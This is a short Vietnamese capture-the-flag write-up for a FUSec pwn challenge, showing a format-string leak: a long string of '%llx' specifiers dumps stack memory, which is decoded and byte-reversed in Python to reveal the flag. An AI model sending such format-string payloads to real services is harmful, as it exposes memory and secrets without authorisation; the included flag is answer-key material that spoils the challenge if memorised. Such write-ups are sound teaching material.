# Đề bài:
![Screenshot (415)](https://github.com/ductohno/ctf_wup/assets/152991010/6c6df027-8b55-4786-ae30-c62c1c4b18df)

Không có gì để nói cả, truy cập vô nó thôi

![Screenshot (416)](https://github.com/ductohno/ctf_wup/assets/152991010/b93b0ca0-5542-4941-b354-972103072300)

Đơn giản là nó không thể bị buffer overflow, để bài lừa đó
Bài này sẽ sử dụng format string, các bạn có thể tham khảo bài string 1 mảng pwn của picoCTF năm 2024 nhé, cách làm tương tự

Format string xảy ra do bạn dùng lệnh print, lúc đó %llx sẽ được nhầm tưởng như kiểu %d của C á, và bạn có thể đọc trộm 4 ô nhớ trên máy chủ ( đợi học asm rồi nói sau)

Chịu thôi

H là lúc exploit nè
# Hướng khai thác:
Spam lần lượt các thẻ % để đọc ô nhớ, ở đây tôi chọn spam %llx
# Payload:
```
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
```
# Khai thác:
![Screenshot (417)](https://github.com/ductohno/ctf_wup/assets/152991010/dadc837b-fd82-47f8-b68e-58ff5b2b4e3e)

Có thể sử dụng notepad để đưa nó về chuỗi liền, chuỗi đó là:
```
178c28f7faafe03f7906c6c25786c6c25786c6c25786c6c2578786c6c25786c6c257fffda40eaf81000000006c667b636553554634336a37612d67617d78643907fffda40eb08017fffda40eb08x178c2ce7faafe03f7906c25786c6c25786c6c25786c6c25786c786c6c25786c6c257fffda40eaf81000000006c667b636553554634336a37612d67617d78643907fffda40eb08017fffda40eb08lx178c30d7faafe03f79025786c6c25786c6c25786c6c25786c6c786c6c25786c6c257fffda40eaf81000000006c667b636553554634336a37612d67617d78643907fffda40eb08017fffda40eb08llx178c34c7faafe03f790786c6c25786c6c25786c6c25786c6c25786c6c25786c6c257fffda40eaf81000000006c667b636553554634336a37612d67617d78643907fffda40eb08017fffda40eb08178c351
```

Tiếp theo hãy dùng cyberchef để cook nó sang hex:
![Screenshot (418)](https://github.com/ductohno/ctf_wup/assets/152991010/eef7060e-160e-440e-852c-f0d541dab479)

Ở đó có 1 chuỗi rất đáng khả nghi, và đó là đáp án nhưng đang ở dạng edian
## Chuỗi khả nghi:
lf{ceSUF43j7a-ga}xd9


## Quá trình tìm ra flag đúng:
Thực ra cũng không có gì đâu, chỉ là tôi sử dụng 1 đoạn code đơn giản lấy được từ mạng, cứ mỗi 8 byte thì đảo vị trí của nó là ok
### Code:
```
a0='6c667b6365535546'
a1='34336a37612d6761'
a2='7d786439'
print('a'*30)
print(bytes.fromhex(a0)[::-1]+(bytes.fromhex(a1)[::-1])+(bytes.fromhex(a2)[::-1]))
```
# Flag
FUSec{flag-a7j349dx}
